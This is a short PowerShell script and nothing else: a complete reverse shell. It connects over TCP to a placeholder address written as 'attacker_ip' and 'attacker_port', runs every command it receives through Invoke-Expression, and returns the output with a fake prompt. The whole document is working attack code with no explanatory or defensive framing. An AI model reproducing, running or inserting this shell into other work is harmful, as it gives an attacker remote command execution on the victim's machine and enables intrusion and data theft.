$client = New-Object System.Net.Sockets.TCPClient("attacker_ip", attacker_port)
$stream = $client.GetStream()
[byte[]]$buffer = 0..65535|%{0}
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $outdata = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($outdata,0,$outdata.Length)
    $stream.Flush()
}
$client.Close()